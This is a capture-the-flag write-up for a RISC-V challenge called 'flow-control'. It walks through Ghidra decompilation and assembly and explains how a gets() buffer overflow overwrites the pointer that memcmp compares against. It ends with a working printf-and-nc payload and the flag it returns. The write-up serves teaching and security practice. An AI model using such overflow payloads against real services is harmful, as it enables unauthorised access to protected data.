# flow-control writeup

We are given a web interface and telnet port where we can enter a flag, and a
download link to an executable file (containing RISC-V code!). The inputs seem
to be sent to that executable, so, let's have a look at what that executable is
doing!

From Ghidra, we get the following decompilation:

```c
  char stack16[10];
  int2hex(gpbase, stack16);
  stack16[8] = '\n';
  stack16[9] = 0;
  puts("gp: "); puts(stack16);

  d._64_4_ = getenv("FLAG");
  if (d._64_4_ == 0) {
    eputs("ERROR: no FLAG in environment!\n");
    return 1;
  }

  gets(d);
  if (d._0_4_ == "FLG{") {
    if (d[48] == '}') {
      iVar1 = memcmp(d,d._64_4_,49);
      if (iVar1 == 0) {
        puts("Congrats, you got the flag, which was ");
        puts(getenv("FLAG"));
        puts("!\n");
      }
      else {
        iVar1 = 1;
        eputs("Not the right flag, sorry.\n");
      }
    }
    else {
      iVar1 = 1;
      eputs("Bad input: must end with \'}\'\n");
    }
  }
  else {
    iVar1 = 1;
    eputs("Bad input: must start with \'FLG{\'\n");
  }
  return iVar1;
```

The code seems to compare the input with the data from an environment variable.
But how does that comparison get done? Let's have a closer look at the
assembly...

```
	000100a4      c.jal      getenv
	000100a6      addi       s0,gp,-0x7f4
	000100aa      c.sw       a0,0x40(s0)
	000100ac      c.beqz     a0,LAB_00010110
	000100ae      addi       a0,gp,-0x7f4
	000100b2      c.jal      gets

	[...]

	000100ce      c.lw       a1,0x40(s0)
	000100d0      li         a2,0x31
	000100d4      addi       a0,gp,-0x7f4
	000100d8      c.jal      memcmp
```

**Note**: the addresses may look slightly different compared to a binary
obtained during the competition. This may occur because the binary is compiled
separately for each team, and thus may vary slightly.

The code:
1. reads the `FLAG` environment variable and puts a pointer to it into address
   `gp - 0x7f4 + 0x40`
2. reads input from standard input using `gets()`, and putting the result at
   `gp - 0x7f4`
3. compares the data at address `gp - 0x7f4` with the data at
   `*(gp - 0x7f4 + 0x40)` using `memcmp()`

As the code uses the (rightly so) unsafe function `gets()`, this code is
vulnerable to a buffer overflow! When entering more than 64 bytes worth of
input, the next bytes will end up at `gp - 0x7f4 + 0x40`, thus overwriting the
data it checks against.

If you overwrite it with `gp - 0x7f4`, you would make the code compare the
input with itself, thus bypassing the `memcmp` check! This will make the
program give you the flag.

But how do you get the value of `gp`? Luckily, the program prints this at the
beginning. After some basic arithmetic, one can craft a payload that yields the
flag:

```
$ printf "FLG{0123456789abcdef0123456789abcdef0123456789ab}def0123456789ab\x30\x14\x01\x00\n" | nc 127.0.66.1 23
gp: 00011c3c
Congrats, you got the flag, which was FLG{9ac3736be06bbfd6ed47e6b15d2d1dad8d9868610b3e}!
```

Alternatively, piping the output of previous `printf` command into `base64`
yields a string that can be entered in the web interface.

This was a simple RISC-V adaptation of a challenge from a previous edition,
[go-with-the-flow](https://github.com/ULYSSIS-KUL/ulyssisctf-writeups/tree/master/2022/exploit/go-with-the-flow).

